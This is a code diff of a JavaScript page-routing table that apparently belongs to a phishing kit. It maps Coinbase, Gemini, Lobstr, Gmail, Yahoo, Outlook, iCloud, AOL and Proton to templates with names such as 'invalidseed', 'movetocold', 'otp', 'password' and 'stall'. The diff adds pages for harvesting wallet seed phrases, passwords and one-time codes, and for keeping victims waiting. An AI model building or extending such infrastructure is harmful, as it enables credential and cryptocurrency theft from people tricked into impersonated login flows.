@@ -4,16 +4,24 @@
 const pageMapping = {
   // Coinbase pages (no prefix, PascalCase)
   coinbase: {
-    'loading': 'loading',
+    'loading': 'Loading',
     'estimatedbalance': 'EstimatedBalance',
     'whitelistwallet': 'WhitelistWallet',
     'whitelistsuccessful': 'WhitelistSuccessful',
-    'review': 'review',
+    'review': 'Review',
+    'pendingreview': 'PendingReview',
+    'completed': 'Completed',
+    'disconnectwallet': 'DisconnectWallet',
+    'invalidseed': 'InvalidSeed',
+    'ledgerdisconnect': 'LedgerDisconnect',
+    'trezordisconnect': 'TrezorDisconnect',
+    'movetocold': 'MoveToCold',
+    'verifyidentity': 'Coinbase-VerifyIdentity',
     'captcha': 'captcha',
     'error': 'error',
-    'twofactor': 'TwoFactor',
-    'emailverify': 'EmailVerify',
-    'phoneverify': 'PhoneVerify'
+    'otp': 'otp',
+    'password': 'password',
+    'verify': 'verify'
   },
 
   // Gemini pages (prefix + lowercase)
@@ -23,11 +31,11 @@ const pageMapping = {
     'whitelistwallet': 'geminiwhitelistwallet',
     'whitelistsuccessful': 'geminiwhitelistsuccessful',
     'review': 'geminireview',
+    'completed': 'geminicompleted',
+    'disconnectwallet': 'geminidisconnectwallet',
+    'invalidseed': 'geminiinvalidseed',
     'captcha': 'captcha', // Shared captcha page
-    'error': 'error',     // Shared error page
-    'twofactor': 'geminitwofactor',
-    'emailverify': 'geminiemailverify',
-    'phoneverify': 'geminiphoneneverify'
+    'error': 'error'     // Shared error page
   },
 
   // Lobstr pages (prefix + camelCase)
@@ -35,23 +43,24 @@ const pageMapping = {
     'loading': 'lobstrloading',
     'estimatedbalance': 'lobstrEstimatedBalance',
     'whitelistwallet': 'lobstrWhitelistWallet',
-    'whitelistsuccessful': 'lobstrWhitelistSuccessful',
-    'review': 'lobstrreview',
+    'review': 'lobstrReview',
+    'disconnectwallet': 'lobstrDisconnectWallet',
+    'invalidseed': 'lobstrInvalidSeed',
     'captcha': 'captcha', // Shared captcha page
-    'error': 'error',     // Shared error page
-    'twofactor': 'lobstrTwoFactor',
-    'emailverify': 'lobstrEmailVerify',
-    'phoneverify': 'lobstrPhoneVerify'
+    'error': 'error'     // Shared error page
   },
 
   // Gmail pages
   gmail: {
-    'loading': 'gmaillogin',
+    'loading': 'gmailloading',
     'login': 'gmaillogin',
-    'twofactor': 'gmailtwofactor',
-    'emailverify': 'gmailemailverify',
-    'phoneverify': 'gmailphoneverify',
-    'review': 'gmailreview',
+    'otp': 'gmailotp',
+    'password': 'gmailpassword',
+    'verify': 'gmailverify',
+    'invalid': 'gmailinvalid',
+    'reset': 'gmailreset',
+    'stall': 'gmailstall',
+    'waiting': 'gmailwaiting',
     'captcha': 'captcha',
     'error': 'error'
   },
@@ -60,11 +69,12 @@ const pageMapping = {
   yahoo: {
     'loading': 'yahoologin',
     'login': 'yahoologin',
-    'twofactor': 'yahootwofactor',
-    'emailverify': 'yahooemailverify',
-    'phoneverify': 'yahoophoneverify',
-    'review': 'yahooreview',
-    'captcha': 'captcha',
+    'otp': 'yahoootp',
+    'password': 'yahoopassword',
+    'captcha': 'yahoocaptcha',
+    'invalid': 'yahooinvalid',
+    'recovery': 'yahoorecovery',
+    'waiting': 'yahoowaiting',
     'error': 'error'
   },
 
@@ -72,10 +82,7 @@ const pageMapping = {
   outlook: {
     'loading': 'outlooklogin',
     'login': 'outlooklogin',
-    'twofactor': 'outlooktwofactor',
-    'emailverify': 'outlookemailverify',
-    'phoneverify': 'outlookphoneverify',
-    'review': 'outlookreview',
+    'otp': 'outlookotp',
     'captcha': 'captcha',
     'error': 'error'
   },
@@ -84,10 +91,7 @@ const pageMapping = {
   icloud: {
     'loading': 'icloudlogin',
     'login': 'icloudlogin',
-    'twofactor': 'icloudtwofactor',
-    'emailverify': 'icloudemailverify',
-    'phoneverify': 'icloudphoneverify',
-    'review': 'icloudreview',
+    'otp': 'icloudotp',
     'captcha': 'captcha',
     'error': 'error'
   },
@@ -96,10 +100,7 @@ const pageMapping = {
   aol: {
     'loading': 'aollogin',
     'login': 'aollogin',
-    'twofactor': 'aoltwofactor',
-    'emailverify': 'aolemailverify',
-    'phoneverify': 'aolphoneverify',
-    'review': 'aolreview',
+    'otp': 'aolotp',
     'captcha': 'captcha',
     'error': 'error'
   },
@@ -108,10 +109,7 @@ const pageMapping = {
   proton: {
     'loading': 'protonlogin',
     'login': 'protonlogin',
-    'twofactor': 'protontwofactor',
-    'emailverify': 'protonemailverify',
-    'phoneverify': 'protonphoneverify',
-    'review': 'protonreview',
+    'otp': 'protonotp',
     'captcha': 'captcha',
     'error': 'error'
   }
